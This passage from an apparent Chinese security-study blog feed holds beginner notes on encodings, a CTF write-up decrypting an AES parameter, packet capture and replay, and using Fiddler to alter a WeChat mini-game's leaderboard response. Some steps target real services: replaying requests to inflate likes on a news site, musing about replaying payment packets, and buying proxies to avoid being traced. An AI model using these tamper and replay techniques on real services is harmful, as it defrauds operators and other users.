传输数据编码</h2><ul><li><p>BASE64：是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,<strong>结尾通常有符号=</strong>，密文长度不固定，随着明文长度增加而增加</p><p>例如：国外web：www.comresearch.org/researchDetails.php?id=MD== MD==为BASE64编码的1</p></li><li><p>BASE32：特点是明文超过十个后面就会有很多等号，Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个</p></li><li><p>搜狐视频：<a href="https://tv.sohu.com/v/MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==.html">https://tv.sohu.com/v/MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==.html</a> 20211230/n601145510.shtml的base64就是MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==</p></li><li><p>URL：由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔</p><p>个人博客： <a href="http://www.xiaodi8.com/search.php?q=%E5%9F%B9%E8%AE%AD">http://www.xiaodi8.com/search.php?q=%E5%9F%B9%E8%AE%AD</a> </p></li><li><p>HEX：是计算机中数据的一种表示方法,将数据进行十六进制转换,它由 0-9,A-F组成</p></li><li><p>ASCII编码：将 128 个字符进行进制数来表示,常见 ASCII 码表大小规则：0~9&lt;A~Z&lt;a~z，详情参考ASCII码表，均由数字组成</p></li><li><p>应用场景：参数传递（注入影响），WAF绕过干扰写法应用，视频地址还原</p></li></ul><h2 id="0x2-JS前端代码加密"><a href="#0x2-JS前端代码加密" class="headerlink" title="0x2. JS前端代码加密"></a>0x2. JS前端代码加密</h2><ul><li><p>JS颜文字：一堆颜文字构成的js代码，AAencode可以直接解密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411140734117.png" alt="image-20240411140734117"></p></li><li><p>jother：只用<mark class="hl-label purple">!+()[]{}</mark> 这八个字符就能完成对任意字符串的编码</p></li><li><p>JSFUCK：与jother很像，只是没有<mark class="hl-label purple">{}</mark> </p></li></ul><h2 id="0x3-后端代码加密"><a href="#0x3-后端代码加密" class="headerlink" title="0x3. 后端代码加密"></a>0x3. 后端代码加密</h2><p>三种常见的后端代码：PHP、.NET、JAVA</p><p>加密原因：某些厂商开发了一些程序后，不想自己开发了几年的程序被别的厂商直接使用并且在上面扩展，此时会对后端源代码进行相应的加密</p><ul><li>PHP：加密后会乱码，一般头部会显示相应的加密方式</li><li>.NET：加密后会变成DLL封装代码，相应的解密工具：<mark class="hl-label purple">ILSpy</mark> </li><li>JAVA：JAR&amp;CLASS文件，相应工具：<mark class="hl-label purple">IDEA</mark>  （和逆向相关联）</li></ul><h2 id="0x4-识别算法编码类型"><a href="#0x4-识别算法编码类型" class="headerlink" title="0x4. 识别算法编码类型"></a>0x4. 识别算法编码类型</h2><ol><li>看密文位数</li><li>看密文的组成特征（数字、字母、大小写、符号等）</li><li>当前密码存在的地方（Web、数据库、操作系统等应用）</li></ol><h2 id="0x5-拓展补充资料"><a href="#0x5-拓展补充资料" class="headerlink" title="0x5. 拓展补充资料"></a>0x5. 拓展补充资料</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析</a></p><p><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结</a></p><p><a href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a></p><h2 id="0x6-CTF实战"><a href="#0x6-CTF实战" class="headerlink" title="0x6. CTF实战"></a>0x6. CTF实战</h2><h3 id="SQL注入漏洞测试（参数加密）综合"><a href="#SQL注入漏洞测试（参数加密）综合" class="headerlink" title="SQL注入漏洞测试（参数加密）综合"></a>SQL注入漏洞测试（参数加密）综合</h3><p>题目链接：<a href="https://www.mozhe.cn/bug/detail/110">https://www.mozhe.cn/bug/detail/110</a></p><p>启动靶场环境，如下图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153031865.png" alt="image-20240411153031865"></p><p>先拿御剑扫一扫后台，看一看有没有相应的隐藏目录</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153427345.png" alt="image-20240411153427345"></p><p>访问一下第一个地址</p><p>发现有一个list.zip,点击下载</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153627355.png" alt="image-20240411153627355"></p><p>点击list.php，里面有这么一串解密代码，通过搜索mcrypt_module_open函数可以知道，这是一种AES加密算法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153723434.png" alt="image-20240411153723434"></p><p>同时，以下两行代码告诉了我们一些AES加密的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br></pre></td></tr></table></figure><p>同时，<code>$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</code>告诉我们data又被进行了两次base64加密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411154920767.png" alt="image-20240411154920767"></p><p>查看网站源码，将id拿去解密，根据加密的逆过程，解密先拿去base64解密，再去以加密模式CBC，加密位数128位，加密密码ydhaqPQnexoaDuW3，加密偏移量2018201920202021的解密方式去解密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411155540257.png" alt="image-20240411155540257"></p><div class="note danger modern"><p>AES加密后默认的输出结果是base64编码格式的，所以后续只需进行一次base64加密即可。</p></div><p>base64解密为：eII8c3JeL0t0dxM7wb3Nzg==</p><p>拿去AES解密，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411160146974.png" alt="image-20240411160146974"></p><p>后续涉及SQL注入，就不在这继续写下去</p><h3 id="学逆向-Jsfuck-JSFUCK"><a href="#学逆向-Jsfuck-JSFUCK" class="headerlink" title="学逆向-Jsfuck-JSFUCK"></a>学逆向-Jsfuck-JSFUCK</h3><p>题目链接：<a href="https://www.xuenixiang.cn/ctfexercise-competition-498.html">jsfuck - CTF练习平台_ - 学逆向论坛 - Powered by Discuz! (xuenixiang.cn)</a></p><p>打开附件，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411170553718.png" alt="image-20240411170553718"></p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411170613875.png" alt="image-20240411170613875"></p><p>发现是一堆符号，联想题目，应该是JSfuck加密，复制去解密，解密为CTF{whatfk}</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -加密解密 -Web安全 -数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB应用</title>
      <link href="/post/883d81a3.html"/>
      <url>/post/883d81a3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-抓包技术应用意义"><a href="#0x0-抓包技术应用意义" class="headerlink" title="0x0. 抓包技术应用意义"></a>0x0. 抓包技术应用意义</h2><p> 原始数据-&gt;过滤-&gt;分析,这是数据处理的基本套路,抓包的目的就是为了获取到想要的原始数据，拿到数据以后，我们就可以做以下一些事情:</p><ol><li>分析数据传输协议。</li><li>定位网络协议的问题。</li><li>从数据包中获取想要的信息。</li><li>将截取到的数据包进行修改，伪造，重发。</li></ol><div class="note primary no-icon flat"><p>由于网上的某些应用是看不到的，通过抓包分析，我们可以找到隐藏在应用下的IP，进而找到服务器，实现渗透</p></div><h2 id="0x1-抓包工具"><a href="#0x1-抓包工具" class="headerlink" title="0x1. 抓包工具"></a>0x1. 抓包工具</h2><div class="tip info"><p>由于实现原理不同，不同的抓包工具的应用也不同，只抓HTTP/HTTPS的是靠代理进行截取；抓所有的一般是抓取网络接口</p></div><p>Charles（茶杯）：</p><ul><li>优点：排序合理，会帮你把数据包全部排列好，展示的有条理，是一个 HTTP 代理服务器,HTTP 监视器,反转代理服务器，当浏览器连接 Charles 的代理访问互联网时，Charles 可以监控浏览器发送和接收的所有数据</li><li>缺点：查找包和筛选包麻烦，有时需要筛选很久</li></ul><p>Fiddler：是一个 http 协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的 http 通讯、设置断点、查看所有的“进出”Fiddler 的数据（指 cookie,html,js,css 等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露 http 通讯，还提供了一个用户友好的格式（格式很简单）</p><p>Burpsuite：是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报，可以点对点提供信息，更清晰</p><div class="note danger modern"><p>这三种工具基本只能抓web应用（走http协议的）其余协议抓不到</p></div><p>下面介绍其余几种可以抓其他协议的</p><p> Wireshark：是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark 使用 WinPCAP 作为接口，直接与网卡进行数据报文交换，所以基本上所有的协议可以抓到</p><p>科来网络分析系统：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题，可以分进程查看数据包。<mark class="hl-label purple">全中文界面，对新手十分友好</mark> </p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406205327653.png" alt="image-20240406205327653"></p><h2 id="0x2-封包技术"><a href="#0x2-封包技术" class="headerlink" title="0x2. 封包技术"></a>0x2. 封包技术</h2><p>首先要了解抓包和封包有什么区别，其实就是零散和整体的区别，抓包抓的可能是很多零散的包，即一次事件会产生很多个数据包，抓包会把所有的数据包抓出来并一条一条呈现在面前，封包技术就是把一次事件产生的所有数据包放在一起呈现在面前，即<strong>零散和整体</strong>的区别</p><p>使用封包监听工具（傻瓜式一体化抓封包，WPE也可以，但是并不是一体化，有点麻烦）</p><p>下载地址：封包监听工具2.3</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://pan.baidu.com/s/18l6LhKJd3NWPAr46DLQhZw</span><br></pre></td></tr></table></figure><p>提取码：03hz</p><h2 id="0x3-实战案例-使用封包技术完成自动回城"><a href="#0x3-实战案例-使用封包技术完成自动回城" class="headerlink" title="0x3. 实战案例-使用封包技术完成自动回城"></a>0x3. 实战案例-使用封包技术完成自动回城</h2><h3 id="1-下载雷电模拟器"><a href="#1-下载雷电模拟器" class="headerlink" title="1.下载雷电模拟器"></a>1.下载雷电模拟器</h3><p>雷电模拟器是一款可以让手机应用及游戏在电脑上运行的软件，类似于虚拟手机，可以满足我们在PC端进行抓包的需求，同时，雷电模拟器具有运行游戏流畅的功能，比较适配我们本次实验的需求</p><h3 id="2-打开雷电模拟器的端游"><a href="#2-打开雷电模拟器的端游" class="headerlink" title="2.打开雷电模拟器的端游"></a>2.打开雷电模拟器的端游</h3><p>如下图所示，还是熟悉的味道</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240410200940757.png" alt="image-20240410200940757"></p><p>在封包监听工具上选择雷电的进程，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/bc9bf21d177a37ebd6f4fdca8802edeb.png" alt="bc9bf21d177a37ebd6f4fdca8802edeb"></p><p>点击开始抓包，在传奇的界面上点击回城，点击后立马点击停止抓包，抓取到的包如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/35a14f59ecf1778f8d9e31a48930872a.png" alt="35a14f59ecf1778f8d9e31a48930872a"></p><p>我们只需关注发送包，重复发送相应的发送包，可以看到人物自动回城</p><div class="note danger modern"><p>看着很没用，但是如果我们在充值的时候拦截封包，并重复发送封包，是否能达到重复充值的功能</p><p>我的设想，没敢尝试，也没必要为了这个充10块钱💩💩💩</p></div>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 抓包封包技术 </tag>
            
            <tag> 协议 </tag>
            
            <tag> APP </tag>
            
            <tag> PC应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fiddler抓取微信小程序包</title>
      <link href="/post/20fa1015.html"/>
      <url>/post/20fa1015.html</url>
      
        <content type="html"><![CDATA[<p class='p center logo large red'>声明</p><ul><li><p>该博客大部分文章来自作者日常学习笔记，未经授权，严禁转载，如需转载，联系我</p></li><li><p>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本博客无关</p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>0x0.前言</p></div></div></h2><div class="note primary no-icon flat"><p>最近看了看一些公众号上的文章，发现一个用fiddler抓取羊了个羊的教程。对我这种小白来说，这种实验既有吸引力复现难度也不高，所以打算自己动手实操一下😍😍😍</p><p>以下内容是对本次实验的复现</p></div><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 60%" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100"><p>0x1.实验准备</p></div></div></h2><h3 id="1-fiddler简介"><a href="#1-fiddler简介" class="headerlink" title="1. fiddler简介"></a>1. fiddler简介</h3><div class="note primary no-icon flat"><p>最开始的时候，发现作者使用了fiddler这个工具，当时没听说过这个工具，很好奇和burp、wireshark有什么区别，后来在实际应用中呢，发现它好像综合了burp和wireshark，fiddler可以将网络传输发送与接收的数据包进行截获、重发、编辑和转存等操作；fiddler是通过改写HTTP代理，让数据从它那里通过，并监控并且截取到数据，并且在打开的一瞬间设置好了浏览器代理，关闭fiddler的时候，它又把代理还原了，这一点比burp好用多了，不像burp有时候忘记关代理，浏览器直接用不了🥵🥵</p><p>我个人觉得比较好的是fiddler的界面比较好看，没有wireshark那么单调，直接上图 </p></div><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412164247019.png" alt="image-20240412164247019"></p><p>fiddler自带的图标可以很明确的告诉我们一些相关的信息，可以来说非常的方便</p><h3 id="2-下载Fiddler-Classic"><a href="#2-下载Fiddler-Classic" class="headerlink" title="2. 下载Fiddler Classic"></a>2. 下载Fiddler Classic</h3><p>👉<a href="https://www.telerik.com/download/fiddler">快速通道</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240405112335917.png" alt="image-20240405112335917"></p><p>下载exe文件后无脑安装，嘎嘎下一步就行，选好自己的路径就可以</p><h3 id="3-下载并安装Fiddler证书生成器"><a href="#3-下载并安装Fiddler证书生成器" class="headerlink" title="3. 下载并安装Fiddler证书生成器"></a>3. 下载并安装Fiddler证书生成器</h3><p>👇 👇 👇 👇 👇 👇</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2</span><br></pre></td></tr></table></figure><h3 id="4-配置Fiddler"><a href="#4-配置Fiddler" class="headerlink" title="4. 配置Fiddler"></a>4. 配置Fiddler</h3><p>打开Fiddler，点击Tools——&gt;Options</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b3e9920fd4e8f1ab0bcc1b870382af8c.png" alt="b3e9920fd4e8f1ab0bcc1b870382af8c"></p><p>进入HTTPS选项进行设置，勾选如下图所示即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/bcaf5114f203da95138d603f777eb90c.png" alt="bcaf5114f203da95138d603f777eb90c"></p><p>之后点击右上角Actions选项，选择Export Root Certificate to Desktop，将Fiddler的证书导入在桌面上，你的桌面上将会出现FiddlerRoot.cer文件，点击OK设置成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/faaa66ac42053ae9d274d8b8a2d094f8.png" alt="faaa66ac42053ae9d274d8b8a2d094f8"></p><p>点击Connections，设置如下所示，将端口号设置为8888，勾选如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/94dcbf2b5255953c34912722586a8d53.png" alt="94dcbf2b5255953c34912722586a8d53"></p><p>设置完之后重启Fiddler，就可以开始抓包了</p><h3 id="5-浏览器导入FiddlerRoot-cer证书"><a href="#5-浏览器导入FiddlerRoot-cer证书" class="headerlink" title="5. 浏览器导入FiddlerRoot.cer证书"></a>5. 浏览器导入FiddlerRoot.cer证书</h3><p>以Edge浏览器为例，打开浏览器设置，在设置的搜索框中输入证书，找到管理证书界面，并点击</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c512f2bde23d9420e3b11b55d10cc588.png" alt="c512f2bde23d9420e3b11b55d10cc588"></p><p>找到受信任的根证书颁发机构，点击导入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f4f2ce705bc1e83d7de13adb19c6b690.png" alt="f4f2ce705bc1e83d7de13adb19c6b690"></p><p>按照它的指导将FiddlerRoot.cer导入进去，导入之后重启Fiddler就可以抓包了</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>0x2.开始抓包</p></div></div></h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0f8c368c50b7f8166d9298dd380829d3.png" alt="0f8c368c50b7f8166d9298dd380829d3"></p><p>打开微信，点击右上角设置按钮，进入设置页面，使用代理点击开启</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5ce248d1c14c895ad2ab24766216cd80.png" alt="5ce248d1c14c895ad2ab24766216cd80"></p><p>填写如下所示，地址填写主机ip地址，端口填写Fiddler设置的端口号，点击确定即可（<strong>注意一定要将fiddler打开，不然连接不上</strong>）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110429389.png" alt="image-20240406110429389"></p><p>看到有WeChat包的时候说明此时可以抓取到WeChat，之后点击小程序，打开羊了个羊</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110631667.png" alt="image-20240406110631667"></p><p>看到这个sheep的，就知道是抓取到了羊了个羊</p><p>如果要修改排名信息，可以点开排行榜，可以看到我们抓取到了相关的数据包，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111527252.png" alt="image-20240406111527252"></p><p>设置断点，准备拦截下一次的请求，找到主页框Rules。下拉找到Automatic Breakpoint，点击Before Requests，即在全部请求前设置断点</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111649105.png" alt="image-20240406111649105"></p><p>之后再打开羊了个羊的排行榜，发现排行榜加载不出来，说明拦截成功，接下来改包返回即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111853888.png" alt="image-20240406111853888"></p><p>在fiddler界面上，点击Break on response，在Raw下改包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/af6d4b3d035435f128c530a112758836.png" alt="af6d4b3d035435f128c530a112758836"></p><p>改好后点击Run to Completion，看羊了个羊主界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1aae3ef95fc8d40fdd64c1b470b02a29.png" alt="1aae3ef95fc8d40fdd64c1b470b02a29"></p><p>改包成功！！！</p><div class="note danger modern"><p>操作有风险，模仿需谨慎</p></div>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 随便试试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-Web应用&amp;架构建设&amp;漏洞&amp;HTTP数据包&amp;代理服务器</title>
      <link href="/post/16b91a53.html"/>
      <url>/post/16b91a53.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-知识点速览"><a href="#0x0-知识点速览" class="headerlink" title="0x0. 知识点速览"></a>0x0. 知识点速览</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="0x1-网站搭建前置知识"><a href="#0x1-网站搭建前置知识" class="headerlink" title="0x1. 网站搭建前置知识"></a>0x1. 网站搭建前置知识</h2><p>域名：符号化的地址方案，来代替数字型的 IP 地址，每一个符号化的地址都与特定的IP地址对应，为了方便人们记忆而不用记住IP地址</p><p>DNS：Domain Name System，域名系统，因特网上作为域名和IP地址互相映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p><h2 id="0x2-WEB应用环境架构类"><a href="#0x2-WEB应用环境架构类" class="headerlink" title="0x2. WEB应用环境架构类"></a>0x2. WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构：</p><p><strong>开发语言，程序源码，中间容器，数据库类型，服务器操作系统，第三方软件等</strong></p><ul><li>开发语言：asp，php,aspx,jsp,java,python,ruby,go,html等</li><li>程序源码：根据开发语言分类；应用类型分类（交友||论坛||博客）；开源CMS分类（用的人多了之后变成CMS源码）；开发框架分类（源码封装后变为框架，直接调用）等</li><li>中间件容器（支持网站运行）：IIS，Apache，Nginx，Tomcat，Weblogic，Jboos，glasshfish等</li><li>数据库类型：Access，Mysql，Oracle，db2，Sybase，Redis，MongoDB</li><li>服务器操作系统：Linux、Windows、Mac系列</li><li>第三方软件：phpmyadmin，vs-ftpd，VNC，ELK，Openssh等</li></ul><p>通过详细了解上述角色功能架构，可以方便我们对症下药，在爆出漏洞的第一时间知道相关的知识</p><h2 id="0x3-WEB应用安全漏洞分类"><a href="#0x3-WEB应用安全漏洞分类" class="headerlink" title="0x3. WEB应用安全漏洞分类"></a>0x3. WEB应用安全漏洞分类</h2><p>明白一个理念，关于WEB应用安全的漏洞，大部分都是在程序源码中产生的（<strong>代码写的不好产生安全问题</strong>）</p><ul><li><p>SQL注入：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></li><li><p>文件安全：用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器</p></li><li><p>RCE执行：RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p></li><li><p>XSS跨站：跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击</p></li><li><p>CRLF：这个漏洞名词来源于打印机，在计算机中表示一行的结束，通过控制CR和LF的出现，在拼接http响应头的过程中，服务器检测到<code>\r\n</code>的时候会按照http规范认为已经到达一行的末尾，后面的数据输出到下一行。在对文件进行io读写的时候也经常会以<code>\r\n</code>或者<code>\n</code>作为判断行末尾的依据，后面的数据换行后再输出</p></li><li><p>SSRF：SSRF的意思是服务端请求伪造，如字面意思，就是攻击者构造的由服务器发起请求的一种漏洞。而服务端能够访问外界访问不到的内网，因此可以利用这个特性来攻击部署在内网的脆弱中间件以及其他服务</p></li><li><p>CSRF：中文翻译叫跨站请求伪造，和XSS利用方式有点像，但是XSS利用的是站点内信任的用户，而CSRF是通过伪装成被信任的用户请求受信任网站</p></li><li><p>反序列化：反序列化就是指把字节序列恢复为Java对象的过程</p></li><li><p>逻辑越权：逻辑越权漏洞就是当用户跳过自己的权限限制，去操作同等级用户或者上级用户。正常的情况下，当一个用户去访问某个资源的时候，首先需要去登录验证自己的权限，其次是对数据的查询，最后返回数据内容。但是如果在权限验证这里，出现了验证不足或者根本就没有验证，那么就会导致越权漏洞的出现</p></li><li><p>未授权访问：是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作</p></li><li><p>XXE/XML：外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互</p></li><li><p>弱口令安全：使用别人容易猜测到的或者破解工具容易破解的口令</p></li></ul><h2 id="0x4-HTTP状态码相关"><a href="#0x4-HTTP状态码相关" class="headerlink" title="0x4. HTTP状态码相关"></a>0x4. HTTP状态码相关</h2><p>文件夹目录返回403，表示文件夹存在（<strong>403为权限不够，不能查看文件夹目录</strong>）404表示不存在</p><p>文件返回200存在，返回404不存在</p><p>3xx表示跳转：处置过程，判断可有可无</p><p>5xx表示内部错误：服务器问题，文件判断可有可无</p><p>所以在使用目录扫描时，3xx和5xx一般勾选上（自己无法判断，宁可错误也别放过）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406172115150.png" alt="image-20240406172115150"></p><h2 id="0x5-代理服务"><a href="#0x5-代理服务" class="headerlink" title="0x5. 代理服务"></a>0x5. 代理服务</h2><p>代理包括内部代理和远程代理，内部代理就是burp、fiddler等一类中间工具</p><p>远程代理：快速更换代理，防止被拉黑被溯源，防止身份鉴别（web搜索<strong>快代理</strong>可以购买）</p><h2 id="0x6-演示案例"><a href="#0x6-演示案例" class="headerlink" title="0x6. 演示案例"></a>0x6. 演示案例</h2><h3 id="1-请求包-新闻回帖点赞-重放数据包"><a href="#1-请求包-新闻回帖点赞-重放数据包" class="headerlink" title="1.请求包-新闻回帖点赞-重放数据包"></a>1.请求包-新闻回帖点赞-重放数据包</h3><div class="note danger modern"><p>仅对于无身份认证的网页有效，有身份认证的无法重复刷赞（代码逻辑不一样，限定条件不一样）</p></div><p>将浏览器配置改为和自己burp配置相同（推荐一个小工具，Edge插件proxy switcher）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/a9bfca6a5fe6d48175660023e6ffad58.png" alt="a9bfca6a5fe6d48175660023e6ffad58"></p><p>打开新浪网，随便点开一个新闻，进入评论，同时把burp的拦截打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9025310b3400c30f0a7a3df0b991b94d.png" alt="9025310b3400c30f0a7a3df0b991b94d"></p><p>点赞后，抓取数据包，不停的转发数据包，可以发现点赞数一直在上升</p><h3 id="2-请求包-修改UA头"><a href="#2-请求包-修改UA头" class="headerlink" title="2.请求包-修改UA头"></a>2.请求包-修改UA头</h3><p>有时候电脑不能访问到手机的某些页面，即某些网页只针对于手机界面，此时可以通过burp修改数据包请求头（UA）使得电脑浏览器能够访问到手机界面，进而进行一些操作</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 架构建设 </tag>
            
            <tag> 代理服务器 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> HTTP数据包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网实验-实现SMTP发送邮件</title>
      <link href="/post/66fb5f37.html"/>
      <url>/post/66fb5f37.html</url>
      
